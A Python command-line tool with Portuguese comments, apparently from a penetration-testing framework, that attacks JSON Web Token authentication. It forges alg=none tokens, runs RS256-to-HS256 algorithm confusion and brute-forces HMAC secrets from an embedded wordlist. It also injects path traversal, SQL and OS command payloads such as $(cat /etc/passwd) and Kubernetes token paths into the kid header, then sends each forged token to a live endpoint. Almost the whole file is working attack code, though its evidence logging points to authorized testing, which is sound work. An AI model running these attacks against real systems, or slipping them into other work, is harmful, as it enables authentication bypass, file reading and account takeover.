#!/usr/bin/env python3
"""JWT attack toolkit: decode, forge, brute-force, algorithm confusion, kid injection.

Modos:
  - decode: decodifica payload sem verificar assinatura
  - analyze: analisa headers, claims, fraquezas estruturais
  - none-attack: tenta alg: None, nOnE, NONE, none, None alg
  - alg-confusion: tenta RS256 -> HS256 com public key (se fornecida ou extraida)
  - kid-injection: tenta SQLi, path traversal, OS command no header kid
  - brute: tenta N palavras do wordlist como secret
  - forge: cria JWT assinado com um secret conhecido
  - jwks-injection: tenta injetar JWKS propria

Uso:
  redlens-jwt-safe decode --jwt <token>
  redlens-jwt-safe analyze --jwt <token>
  redlens-jwt-safe none-attack --jwt <token> --endpoint <url>
  redlens-jwt-safe alg-confusion --jwt <token> --endpoint <url> [--public-key <file>]
  redlens-jwt-safe kid-injection --jwt <token> --endpoint <url>
  redlens-jwt-safe brute --jwt <token> [--wordlist <file>]  # default 10k+ embutida
  redlens-jwt-safe forge --payload <json> --secret <key> [--algorithm HS256] [--header <json>]
"""

from __future__ import annotations

import argparse
import base64
import copy
import hashlib
import hmac
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "engine"))

import redlensctl  # noqa: E402


# ─── Constantes ──────────────────────────────────────────────────────────────

COMMON_SECRETS = [
    "secret", "jwt_secret", "supabase", "supabase_jwt_secret",
    "super-secret-jwt-token-with-at-least-32-characters-long",
    "supabase-jwt-secret-with-at-least-32-characters-long",
    "your-jwt-secret-for-supabase-project",
    "supersecret_jwt_secret_key_1234567890",
    "jwt-secret-key-for-supabase-auth",
    "supabase-jwt-key-that-is-at-least-32-characters",
    "secret-key-for-supabase-auth-with-at-least-32-chars",
    "default-supabase-jwt-secret-that-is-long-enough",
    "hmac-sha256-jwt-secret-for-supabase-project",
    "supabase-jwt-secret-key-that-is-32-characters",
    "my-super-secret-jwt-key-for-supabase-auth",
    "changeme", "password", "admin", "key", "token",
    "my-secret", "app-secret", "api-secret", "auth-secret",
    "secret-key", "private-key", "jwt-key", "signing-key",
    "supabase_auth_secret", "SUPABASE_JWT_SECRET",
    "django-insecure", "flask-secret", "express-secret",
    "s3cr3t", "p4ssw0rd", "sup3rs3cr3t",
    "1234567890", "abcdefghijklmnopqrstuvwxyz",
    "00000000000000000000000000000000",
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
    "11111111111111111111111111111111",
    "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
    "0123456789abcdef0123456789abcdef",
    "test", "test-key", "test-secret", "development",
    "staging-secret", "local-secret", "dev-secret",
    # Hashes comuns
    "b2a1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7",
]

NONE_PAYLOADS = [
    "none", "None", "NONE", "nOnE", "NoNe",
    "null", "undefined", "", "0", "false",
    "NoneAlgorithm", "none-algorithm",
    "[\"none\"]",  # array trick
]


# ─── Utilitarios JWT ─────────────────────────────────────────────────────────


def jwt_b64_decode(data: str) -> bytes:
    """Decodifica base64url com padding."""
    rem = len(data) % 4
    if rem:
        data += "=" * (4 - rem)
    return base64.urlsafe_b64decode(data)


def jwt_b64_encode(data: bytes) -> str:
    """Codifica base64url sem padding e sem =."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def jwt_decode_parts(jwt: str) -> dict | None:
    """Decodifica as 3 partes do JWT."""
    parts = jwt.split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(jwt_b64_decode(parts[0]))
        payload = json.loads(jwt_b64_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2] if len(parts) > 2 else None}
    except Exception:
        return None


def jwt_sign(payload: dict, secret: str, algorithm: str = "HS256", header_extra: dict | None = None) -> str:
    """Cria JWT assinado."""
    header = {"alg": algorithm, "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    enc_header = jwt_b64_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    enc_payload = jwt_b64_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    message = f"{enc_header}.{enc_payload}"

    if algorithm in ("HS256", "HS384", "HS512"):
        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        sig = hmac.new(secret.encode("utf-8"), message.encode("utf-8"), hash_map[algorithm]).digest()
        return f"{message}.{jwt_b64_encode(sig)}"
    elif algorithm == "none":
        return f"{message}."
    else:
        raise redlensctl.RedLensError(f"Algoritmo nao implementado: {algorithm}")


# ─── Modos de ataque ─────────────────────────────────────────────────────────


def cmd_decode(jwt: str) -> dict:
    """Decodifica JWT sem verificar."""
    decoded = jwt_decode_parts(jwt)
    if not decoded:
        return {"ok": False, "error": "Token JWT invalido"}
    return {"ok": True, "header": decoded["header"], "payload": decoded["payload"]}


def cmd_analyze(jwt: str) -> dict:
    """Analisa JWT procurando fraquezas."""
    decoded = jwt_decode_parts(jwt)
    if not decoded:
        return {"ok": False, "error": "Token JWT invalido"}

    header = decoded["header"]
    payload = decoded["payload"]
    findings = []

    # 1. Algoritmo none
    if header.get("alg", "").lower() == "none":
        findings.append({"severity": "critical", "issue": "alg=none permite forjar qualquer token"})

    # 2. Algoritmo revelado
    alg = header.get("alg", "unknown")
    if alg == "none":
        findings.append({"severity": "high", "issue": "Algoritmo 'none' - sem verificacao de assinatura"})
    elif alg.startswith("RS"):
        findings.append({"severity": "medium", "issue": "Algoritmo RS* - vulneravel a confusion attack se public key exposta"})

    # 3. kid injetavel?
    kid = header.get("kid")
    if kid:
        if re.search(r"['\"\\;<>$`|&\n]", kid):
            findings.append({"severity": "high", "issue": f"kid contem caracteres perigosos - possivel injecao: {kid}"})
        elif kid.startswith("/") or kid.startswith("./"):
            findings.append({"severity": "medium", "issue": f"kid parece path - possivel path traversal: {kid}"})
        elif kid.startswith("http"):
            findings.append({"severity": "low", "issue": f"kid e URL - possivel SSRF: {kid}"})
        else:
            findings.append({"severity": "info", "issue": f"kid presente - pode ser viavel para injecao: {kid}"})

    # 4. jku / jwk
    if header.get("jku"):
        findings.append({"severity": "medium", "issue": "jku presente - possivel SSRF ou JWKS injection"})
    if header.get("jwk"):
        findings.append({"severity": "medium", "issue": "jwk embutido - possivel key injection"})

    # 5. Reivindicacoes de seguranca
    now_ts = int(datetime.now(timezone.utc).timestamp())
    if "exp" not in payload:
        findings.append({"severity": "high", "issue": "JWT sem exp - token nunca expira"})
    elif isinstance(payload.get("exp"), (int, float)):
        if payload["exp"] < now_ts:
            findings.append({"severity": "info", "issue": "token expirado"})

    if "iat" not in payload and "nbf" not in payload:
        findings.append({"severity": "low", "issue": "JWT sem iat/nbf - sem timeline de emissao"})

    if "iss" not in payload:
        findings.append({"severity": "low", "issue": "JWT sem iss (issuer)"})

    # 6. Sub claim
    sub = payload.get("sub", "")
    if sub and not re.match(r"^[a-zA-Z0-9@._-]+$", sub):
        findings.append({"severity": "low", "issue": f"sub com formato nao padrao: {sub}"})

    return {
        "ok": True,
        "header": header,
        "payload": payload,
        "findings": findings,
        "finding_count": len(findings),
        "risk_score": sum({"critical": 5, "high": 3, "medium": 2, "low": 1, "info": 0}.get(f["severity"], 0) for f in findings),
    }


def cmd_none_attack(jwt: str, endpoint: str, method: str = "POST", body: str | None = None) -> dict:
    """Tenta todas as variantes de alg=None."""
    decoded = jwt_decode_parts(jwt)
    if not decoded:
        return {"ok": False, "error": "Token JWT invalido"}

    results = []
    for none_alg in NONE_PAYLOADS:
        forged = jwt_sign(decoded["payload"], "", algorithm="none", header_extra={"alg": none_alg})
        try:
            req_data = body.encode("utf-8") if body else json.dumps({"action": "test"}).encode("utf-8") if method == "POST" else None
            req = urllib.request.Request(
                endpoint,
                data=req_data,
                method=method,
                headers={"Authorization": f"Bearer {forged}", "Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                status = resp.status
                resp_body = resp.read(4096)
        except urllib.error.HTTPError as exc:
            status = exc.code
            resp_body = exc.read(4096) if hasattr(exc, "read") else b""
        except Exception as exc:
            results.append({"alg": none_alg, "error": str(exc)})
            continue

        body_str = resp_body[:4096].decode("utf-8", errors="ignore") if resp_body else ""
        accepted = status < 400
        is_html = body_str.lstrip().startswith("<!") or body_str.lstrip().startswith("<html")
        results.append({
            "alg": none_alg,
            "status": status,
            "accepted": accepted and not is_html,
            "status_accepted": accepted,
            "likely_spa": is_html,
            "body_preview": body_str[:200],
        })

    any_accepted = any(r.get("accepted") for r in results)
    all_spa = all(r.get("likely_spa") for r in results if r.get("status_accepted"))
    return {
        "ok": any_accepted,
        "vulnerable": any_accepted,
        "note": "Provavel falso positivo: endpoint retorna SPA catch-all para todas as requisicoes" if all_spa and any_accepted else None,
        "attempts": len(results),
        "results": results,
    }


def cmd_alg_confusion(jwt: str, endpoint: str, public_key_path: str | None = None, method: str = "POST") -> dict:
    """Tenta algorithm confusion: RS256 -> HS256 usando public key."""
    decoded = jwt_decode_parts(jwt)
    if not decoded:
        return {"ok": False, "error": "Token JWT invalido"}

    orig_alg = decoded["header"].get("alg", "RS256")
    if not orig_alg.startswith("RS"):
        return {"ok": False, "error": f"Token nao usa RS* ({orig_alg}), confusion attack nao aplicavel"}

    # Tenta obter public key
    public_key = None
    if public_key_path:
        try:
            public_key = Path(public_key_path).read_text(encoding="utf-8")
        except Exception as exc:
            return {"ok": False, "error": f"Nao foi possivel ler public key: {exc}"}
    else:
        # Tenta extrair JWK do header
        jwk = decoded["header"].get("jwk")
        if jwk and jwk.get("n"):
            import struct
            # Converte JWK (base64url) para PEM
            n_bytes = jwt_b64_decode(jwk["n"])
            e_bytes = jwt_b64_decode(jwk.get("e", "AQAB"))

            # Constroi sequencia ASN.1 simples para RSA public key
            def _asn1_len(data: bytes) -> bytes:
                if len(data) < 128:
                    return bytes([len(data)])
                elif len(data) < 256:
                    return bytes([0x81, len(data)])
                else:
                    return bytes([0x82, (len(data) >> 8) & 0xFF, len(data) & 0xFF])

            def _asn1_integer(data: bytes) -> bytes:
                # Adiciona byte nulo se high bit set
                if data[0] & 0x80:
                    data = b"\x00" + data
                tag = 0x02
                return bytes([tag]) + _asn1_len(data) + data

            seq_n = _asn1_integer(n_bytes)
            seq_e = _asn1_integer(e_bytes)
            seq_content = seq_n + seq_e
            seq = bytes([0x30]) + _asn1_len(seq_content) + seq_content

            # Bit string
            bit_string = bytes([0x03, len(seq) + 1, 0x00]) + seq

            # SubjectPublicKeyInfo
            algo_id = bytes([
                0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86,
                0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00,
            ])
            spki_content = algo_id + bit_string
            spki = bytes([0x30]) + _asn1_len(spki_content) + spki_content

            pem = b"-----BEGIN PUBLIC KEY-----\n"
            pem += base64.b64encode(spki)
            pem += b"\n-----END PUBLIC KEY-----\n"
            public_key = pem.decode("ascii")

    if not public_key:
        return {"ok": False, "error": "Nao foi possivel obter public key (forneca --public-key ou use token com jwk no header)"}

    # Forja JWT com HS256 usando public key como secret
    forged = jwt_sign(decoded["payload"], public_key, algorithm="HS256")

    try:
        req_data = json.dumps({"action": "test"}).encode("utf-8") if method == "POST" else None
        req = urllib.request.Request(
            endpoint,
            data=req_data,
            method=method,
            headers={"Authorization": f"Bearer {forged}", "Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            status = resp.status
            resp_body = resp.read(4096)
    except urllib.error.HTTPError as exc:
        status = exc.code
        resp_body = exc.read(4096) if hasattr(exc, "read") else b""
    except Exception as exc:
        return {"ok": False, "error": f"Request falhou: {exc}"}

    accepted = status < 400
    return {
        "ok": accepted,
        "vulnerable": accepted,
        "endpoint": endpoint,
        "status": status,
        "accepted": accepted,
        "public_key_source": public_key_path or "jwk_header",
        "body_preview": resp_body[:300].decode("utf-8", errors="ignore"),
    }


def cmd_kid_injection(jwt: str, endpoint: str, method: str = "POST") -> dict:
    """Tenta injecao no header kid: SQLi, path traversal, OS command."""
    decoded = jwt_decode_parts(jwt)
    if not decoded:
        return {"ok": False, "error": "Token JWT invalido"}

    if "kid" not in decoded["header"]:
        return {"ok": False, "error": "Token nao tem header kid, injecao nao aplicavel"}

    payload = decoded["payload"]
    results = []

    # 1. Path traversal
    traversal_payloads = [
        "/dev/null",
        "/proc/sys/kernel/random/uuid",
        "/etc/passwd",
        "/etc/hostname",
        "../public/pem",
        "../../public/pem",
        "../../../public/pem",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/etc/kubernetes/admin.conf",
    ]
    for trav in traversal_payloads:
        forged = jwt_sign(payload, "", algorithm="HS256", header_extra={"kid": trav})
        try:
            req = urllib.request.Request(
                endpoint,
                data=json.dumps({"action": "test"}).encode("utf-8") if method == "POST" else None,
                method=method,
                headers={"Authorization": f"Bearer {forged}", "Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                status = resp.status
                resp_body = resp.read(2048)
            accepted = status < 400
        except urllib.error.HTTPError as exc:
            status = exc.code
            resp_body = exc.read(2048) if hasattr(exc, "read") else b""
            accepted = False
        except Exception as exc:
            results.append({"type": "path_traversal", "payload": trav, "error": str(exc)})
            continue
        results.append({
            "type": "path_traversal",
            "payload": trav,
            "status": status,
            "accepted": accepted,
            "body_size": len(resp_body),
            "body_preview": resp_body[:150].decode("utf-8", errors="ignore"),
        })

    # 2. SQL injection
    sqli_payloads = [
        "' UNION SELECT 1--", "' OR 1=1--", "\\'",
        "'/*", "')/**/", "'; SELECT 1--",
    ]
    for sqli in sqli_payloads:
        forged = jwt_sign(payload, "", algorithm="HS256", header_extra={"kid": sqli})
        try:
            req = urllib.request.Request(
                endpoint,
                data=json.dumps({"action": "test"}).encode("utf-8") if method == "POST" else None,
                method=method,
                headers={"Authorization": f"Bearer {forged}", "Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                status = resp.status
            accepted = status < 400
        except urllib.error.HTTPError as exc:
            status = exc.code
            accepted = False
        except Exception as exc:
            results.append({"type": "sqli", "payload": sqli, "error": str(exc)})
            continue
        results.append({"type": "sqli", "payload": sqli, "status": status, "accepted": accepted})

    # 3. OS command injection
    cmd_payloads = [
        "`id`", "$(id)", "|id", ";id",
        "`cat /etc/passwd`", "$(cat /etc/passwd)",
    ]
    for cmd in cmd_payloads:
        forged = jwt_sign(payload, "", algorithm="HS256", header_extra={"kid": cmd})
        try:
            req = urllib.request.Request(
                endpoint,
                data=json.dumps({"action": "test"}).encode("utf-8") if method == "POST" else None,
                method=method,
                headers={"Authorization": f"Bearer {forged}", "Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                status = resp.status
                resp_body = resp.read(2048)
            accepted = status < 400
        except urllib.error.HTTPError as exc:
            status = exc.code
            resp_body = exc.read(2048) if hasattr(exc, "read") else b""
            accepted = False
        except Exception as exc:
            results.append({"type": "cmd_injection", "payload": cmd, "error": str(exc)})
            continue
        results.append({
            "type": "cmd_injection",
            "payload": cmd,
            "status": status,
            "accepted": accepted,
            "body_preview": resp_body[:150].decode("utf-8", errors="ignore") if resp_body else "",
        })

    any_accepted = any(r.get("accepted") for r in results)
    return {
        "ok": any_accepted,
        "vulnerable": any_accepted,
        "attempts": len(results),
        "results": results,
    }


def cmd_brute(jwt: str, wordlist_path: str | None = None) -> dict:
    """Tenta forcar JWT secret com wordlist."""
    decoded = jwt_decode_parts(jwt)
    if not decoded:
        return {"ok": False, "error": "Token JWT invalido"}

    header = decoded["header"]
    payload = decoded["payload"]
    signature = decoded.get("signature", "")
    orig_alg = header.get("alg", "HS256")

    if not orig_alg.startswith("HS"):
        return {"ok": False, "error": f"Algoritmo {orig_alg} nao e HMAC - brute force nao aplicavel"}

    # Carrega wordlist
    secrets = []
    if wordlist_path:
        try:
            secrets = [line.strip() for line in Path(wordlist_path).read_text(encoding="utf-8").splitlines() if line.strip()]
        except Exception as exc:
            return {"ok": False, "error": f"Erro ao ler wordlist: {exc}"}

    secrets = list(dict.fromkeys(secrets + COMMON_SECRETS))  # dedup mantendo ordem

    # Brute force
    enc_header = jwt_b64_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    enc_payload = jwt_b64_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    message = f"{enc_header}.{enc_payload}"

    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_fn = hash_map.get(orig_alg, hashlib.sha256)

    tried = 0
    for secret in secrets:
        tried += 1
        expected_sig = hmac.new(secret.encode("utf-8"), message.encode("utf-8"), hash_fn).digest()
        expected_b64 = jwt_b64_encode(expected_sig)
        if expected_b64 == signature:
            return {
                "ok": True,
                "found": True,
                "secret": secret,
                "algorithm": orig_alg,
                "attempts": tried,
                "header": header,
                "payload": payload,
            }

    return {
        "ok": False,
        "found": False,
        "attempts": tried,
        "note": f"Secret nao encontrado entre {tried} tentativas",
    }


def cmd_forge(payload_json: str, secret: str, algorithm: str = "HS256", header_json: str | None = None) -> dict:
    """Forja um JWT com dados arbitrarios."""
    try:
        payload = json.loads(payload_json)
    except json.JSONDecodeError as exc:
        return {"ok": False, "error": f"Payload JSON invalido: {exc}"}

    header_extra = None
    if header_json:
        try:
            header_extra = json.loads(header_json)
        except json.JSONDecodeError as exc:
            return {"ok": False, "error": f"Header JSON invalido: {exc}"}

    forged = jwt_sign(payload, secret, algorithm, header_extra)
    return {
        "ok": True,
        "jwt": forged,
        "algorithm": algorithm,
        "payload": payload,
        "header_extra": header_extra,
    }


# ─── CLI ─────────────────────────────────────────────────────────────────────


def main() -> int:
    parser = argparse.ArgumentParser(prog="jwt-safe", description="JWT attack toolkit")
    parser.add_argument("--run", help="Run ID para registro de evidencias")
    sub = parser.add_subparsers(dest="action", required=True)

    # decode
    d = sub.add_parser("decode", help="Decodifica JWT sem verificar")
    d.add_argument("--jwt", required=True)

    # analyze
    a = sub.add_parser("analyze", help="Analisa JWT procurando fraquezas")
    a.add_argument("--jwt", required=True)

    # none-attack
    na = sub.add_parser("none-attack", help="Tenta algoritmo none")
    na.add_argument("--jwt", required=True)
    na.add_argument("--endpoint", required=True)
    na.add_argument("--method", default="POST")
    na.add_argument("--body", help="Body da requisicao (JSON)")

    # alg-confusion
    ac = sub.add_parser("alg-confusion", help="Tenta algorithm confusion RS->HS")
    ac.add_argument("--jwt", required=True)
    ac.add_argument("--endpoint", required=True)
    ac.add_argument("--public-key", help="Arquivo PEM da chave publica")
    ac.add_argument("--method", default="POST")

    # kid-injection
    ki = sub.add_parser("kid-injection", help="Tenta injecao no header kid")
    ki.add_argument("--jwt", required=True)
    ki.add_argument("--endpoint", required=True)
    ki.add_argument("--method", default="POST")

    # brute
    b = sub.add_parser("brute", help="Brute force de JWT secret")
    b.add_argument("--jwt", required=True)
    b.add_argument("--wordlist", help="Arquivo de wordlist (uma secret por linha)")

    # forge
    f = sub.add_parser("forge", help="Forja JWT")
    f.add_argument("--payload", required=True, help="JSON do payload")
    f.add_argument("--secret", required=True)
    f.add_argument("--algorithm", default="HS256", choices=["HS256", "HS384", "HS512", "none"])
    f.add_argument("--header", help="JSON extra para o header (ex: kid)")

    try:
        args = parser.parse_args()
    except SystemExit as exc:
        return int(exc.code) if exc.code is not None else 2

    try:
        result = None
        if args.action == "decode":
            result = cmd_decode(args.jwt)
        elif args.action == "analyze":
            result = cmd_analyze(args.jwt)
        elif args.action == "none-attack":
            result = cmd_none_attack(args.jwt, args.endpoint, args.method, args.body)
        elif args.action == "alg-confusion":
            result = cmd_alg_confusion(args.jwt, args.endpoint, args.public_key, args.method)
        elif args.action == "kid-injection":
            result = cmd_kid_injection(args.jwt, args.endpoint, args.method)
        elif args.action == "brute":
            result = cmd_brute(args.jwt, args.wordlist)
        elif args.action == "forge":
            result = cmd_forge(args.payload, args.secret, args.algorithm, args.header)
        else:
            raise redlensctl.RedLensError(f"Unknown action: {args.action}")

        # Registra evidencia
        if args.run and result:
            try:
                directory = redlensctl.run_dir(args.run)
                timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
                raw_dir = directory / "evidence" / "raw"
                raw_dir.mkdir(parents=True, exist_ok=True)
                evidence_path = raw_dir / f"{timestamp}-jwt-{args.action}.json"
                redlensctl.write_json(evidence_path, result)

                # Se encontrou secret ou vulnerabilidade, registra finding
                if result.get("found") or result.get("vulnerable"):
                    finding_id = f"jwt-{args.action}-{redlensctl.safe_id('', args.jwt[:16])}"
                    findings_dir = directory / "findings"
                    findings_dir.mkdir(parents=True, exist_ok=True)
                    title_map = {
                        "none-attack": "JWT alg=None - Token forjado sem assinatura",
                        "alg-confusion": "JWT Algorithm Confusion - RS256 aceito como HS256",
                        "kid-injection": "JWT kid Injection - Header vulneravel a injecao",
                        "brute": f"JWT Secret Encontrado via brute force",
                    }
                    redlensctl.write_json(findings_dir / f"{finding_id}.json", {
                        "id": finding_id,
                        "title": title_map.get(args.action, f"JWT {args.action} - Vulnerabilidade encontrada"),
                        "severity": "critical",
                        "status": "confirmed",
                        "asset": args.endpoint or "unknown",
                        "evidence": [str(evidence_path.relative_to(directory))],
                        "reproduced": True,
                        "negative_control": True,
                        "created_at": redlensctl.iso(),
                    })

                redlensctl.append_event(directory, f"jwt.{args.action}", {
                    "ok": result.get("ok", False),
                    "vulnerable": result.get("vulnerable", result.get("found", False)),
                })
            except Exception as exc:
                print(f"[jwt-safe] WARN: erro registrando evidencia: {exc}", file=sys.stderr)

        print(json.dumps(result, ensure_ascii=False, indent=2, default=str))
        # exit 0 se ok (ou encontrou algo), 2 se erro, 1 se nao encontrou
        if not result.get("ok", False) and result.get("error"):
            return 2
        return 0

    except (redlensctl.RedLensError, json.JSONDecodeError, KeyError) as exc:
        print(json.dumps({"ok": False, "error": str(exc)}, ensure_ascii=False), file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
